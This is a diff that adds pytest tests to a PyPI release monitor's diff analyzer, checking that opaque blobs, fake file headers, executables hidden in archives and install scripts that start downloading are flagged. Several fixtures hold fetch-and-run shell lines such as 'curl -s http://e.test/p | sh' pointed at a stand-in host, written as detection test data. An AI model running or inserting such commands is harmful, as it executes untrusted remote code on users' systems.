@@ -1,6 +1,16 @@
+import bz2
+import gzip
+import io
+import lzma
 import random
+import struct
+import tarfile
+import zipfile
+import zlib
 from collections.abc import Mapping
 from pathlib import Path
+
+import pytest
 
 from pypi_monitor.analyzers.base import ReleaseContext, Signal
 from pypi_monitor.analyzers.diff import DiffAnalyzer
@@ -282,21 +292,131 @@ def test_new_scripts_and_what_they_do(tmp_path: Path) -> None:
     assert by_path["run.ps1"].line == 2
 
 
+def png(payload: bytes) -> bytes:
+    """A real PNG: chunks with their checksums, the payload as compressed pixels."""
+
+    def chunk(kind: bytes, data: bytes) -> bytes:
+        return len(data).to_bytes(4) + kind + data + zlib.crc32(kind + data).to_bytes(4)
+
+    header = struct.pack(">IIBBBBB", 64, 64, 8, 2, 0, 0, 0)
+    pixels = zlib.compress(payload, 0)
+    return (
+        b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", header) + chunk(b"IDAT", pixels) + chunk(b"IEND", b"")
+    )
+
+
 def test_opaque_blobs_but_not_known_formats(tmp_path: Path) -> None:
+    weights = struct.pack("<2048f", *(random.Random(2).gauss(0, 1) for _ in range(2048)))  # noqa: S311
     new: Files = {
         **BASE,
         "a/payload": NOISE,
         "a/logo.png": NOISE,
         "a/key.txt": "QUJD" * 1000,
-        "a/real.png": b"\x89PNG" + NOISE,
-        "a/model.onnx": NOISE,
+        "a/real.png": png(NOISE),
+        "a/weights.bin": weights,
         "a/readme.txt": "plain words " * 500,
+        "a/data.zip": zip_of({"table.csv": b"a,b\n1,2\n" * 300}),
     }
 
     signals = diff(tmp_path, BASE, new)
 
     blobs = {Path(s.file_path or "").name for s in signals if s.rule_id == "diff.file.new_blob"}
     assert blobs == {"payload", "logo.png", "key.txt"}
+
+
+@pytest.mark.parametrize(
+    "fake",
+    [
+        b"\x89PNG" + NOISE,  # The 4 bytes of the header and nothing of the structure.
+        b"\x89PNG\r\n\x1a\n" + NOISE,
+        b"\x00\x01\x00\x00" + NOISE,  # TrueType
+        b"\xff\xd8\xff" + NOISE,
+        b"GIF89a" + NOISE,
+    ],
+)
+def test_a_header_without_its_format_is_opaque(fake: bytes, tmp_path: Path) -> None:
+    signals = diff(tmp_path, BASE, {**BASE, "a/asset.dat": fake})
+
+    blob = next(s for s in signals if s.rule_id == "diff.file.new_blob")
+    assert "structure" in blob.evidence
+
+
+def test_random_bytes_dressed_as_weights_are_opaque(tmp_path: Path) -> None:
+    signals = diff(tmp_path, BASE, {**BASE, "a/model.bin": NOISE, "a/model.onnx": NOISE})
+
+    assert {Path(s.file_path or "").name for s in signals} == {"model.bin", "model.onnx"}
+    assert rules(signals) == {"diff.file.new_blob"}
+
+
+def zip_of(members: Mapping[str, bytes]) -> bytes:
+    buffer = io.BytesIO()
+    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
+        for name, data in members.items():
+            archive.writestr(name, data)
+    return buffer.getvalue()
+
+
+def tar_gz_of(members: Mapping[str, bytes]) -> bytes:
+    buffer = io.BytesIO()
+    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
+        for name, data in members.items():
+            info = tarfile.TarInfo(name)
+            info.size = len(data)
+            archive.addfile(info, io.BytesIO(data))
+    return buffer.getvalue()
+
+
+@pytest.mark.parametrize(
+    ("name", "archive"),
+    [
+        ("tools.zip", zip_of({"readme.txt": b"hi", "bin/helper.exe": b"MZ" + bytes(500)})),
+        ("payload.gz", gzip.compress(b"\x7fELF" + bytes(500))),
+        ("assets.tar.gz", tar_gz_of({"x/icon.txt": b"hi", "x/run": b"\x7fELF" + bytes(500)})),
+        ("nested.zip", zip_of({"inner.zip": zip_of({"deep.so": b"\x7fELF" + bytes(500)})})),
+        ("data.xz", lzma.compress(b"MZ" + bytes(500))),
+        ("data.bz2", bz2.compress(b"MZ" + bytes(500))),
+    ],
+)
+def test_an_executable_inside_a_new_archive_is_a_binary(
+    name: str, archive: bytes, tmp_path: Path
+) -> None:
+    signals = diff(tmp_path, BASE, {**BASE, f"a/{name}": archive})
+
+    assert rules(signals) == {"diff.file.new_binary"}
+    assert "inside an archive" in signals[0].evidence
+
+
+def test_a_downloading_script_inside_an_archive(tmp_path: Path) -> None:
+    archive = zip_of({"setup/install.sh": b"#!/bin/sh\ncurl http://e.test/x | sh\n"})
+
+    signals = diff(tmp_path, BASE, {**BASE, "a/extras.zip": archive})
+
+    assert rules(signals) == {"diff.file.new_script_fetches"}
+
+
+def test_a_broken_archive_is_judged_by_its_bytes(tmp_path: Path) -> None:
+    signals = diff(tmp_path, BASE, {**BASE, "a/fake.zip": b"PK\x03\x04" + NOISE})
+
+    assert rules(signals) == {"diff.file.new_blob"}
+
+
+def test_an_existing_script_that_starts_to_download(tmp_path: Path) -> None:
+    script = "#!/bin/sh\nset -e\npip install .\n"
+    old = {**BASE, "install.sh": script, "build.sh": "#!/bin/sh\ncurl -O http://e.test/a\n"}
+    new = {
+        **BASE,
+        "install.sh": script + "curl -s http://e.test/p | sh\n",
+        # The download was there before: only the rest of the file changed.
+        "build.sh": "#!/bin/sh\ncurl -O http://e.test/a\nmake\n",
+    }
+
+    signals = diff(tmp_path, old, new)
+
+    assert rules(signals) == {"diff.file.new_script_fetches"}
+    assert signals[0].file_path is not None
+    assert signals[0].file_path.endswith("install.sh")
+    assert signals[0].line == 4
+    assert "curl -s http://e.test/p | sh" in signals[0].evidence
 
 
 def test_files_outside_the_installed_package_are_noise(tmp_path: Path) -> None:
